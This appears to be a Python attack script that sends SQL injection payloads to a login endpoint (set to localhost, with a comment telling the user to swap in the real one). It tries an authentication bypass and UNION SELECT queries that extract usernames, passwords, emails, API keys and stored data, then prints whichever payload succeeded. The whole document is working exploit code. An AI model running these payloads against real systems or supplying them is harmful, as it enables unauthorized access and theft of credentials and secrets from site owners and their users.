import requests

url = "http://localhost:5000/login"  # Change to your actual login endpoint

# Advanced SQL Injection Payloads
payloads = [
    "' OR 1=1 --",  # Bypass authentication
    "' UNION SELECT null, username, password FROM users --",
    "' UNION SELECT null, email, api_key FROM users --",
    "' UNION SELECT null, fragment_data FROM storage_fragments --"
]

for payload in payloads:
    data = {"username": f"admin{payload}", "password": "fakepass"}
    response = requests.post(url, data=data)

    if "success" in response.text or "Welcome" in response.text:
        print(f"⚠️ SQL Injection Worked! Payload: {payload}")
        print(f"Response: {response.text}")
